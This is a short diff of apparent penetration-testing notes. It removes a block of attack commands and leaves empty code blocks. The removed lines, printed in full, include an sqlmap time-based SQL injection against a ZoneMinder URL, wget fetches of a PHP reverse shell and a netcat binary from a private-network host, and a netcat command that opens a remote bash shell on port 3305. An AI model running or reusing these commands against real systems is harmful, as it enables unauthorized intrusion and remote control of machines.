@@ -1,22 +1,23 @@
-```
-sqlmap --url="http://http://192.168.232.52/zm/index.php/view=request&request=log&task=query&limit=100;(SELECT *
-FROM (SELECT(SLEEP(5)))OQkj)#&minTime=1466674406.084434
+[[Editing Copy Page]]
+
 ```
 
 ```
-wget http://192.168.45.232:80/php-reverse-shell.php
+
 ```
 
 ```
-wget http://192.168.45.232/bash.sh -O /tmp/bash.sh
+
 ```
 
 ```
-wget http://192.168.45.232/nc -O /tmp/nc && chmod +x /tmp/nc && /tmp/nc -e /bin/bash 192.168.45.232 3305
+
 ```
 
 ```
-/tmp/nc -e /bin/bash 192.168.45.232 3305
+
+```
+
 ```
 
 ```
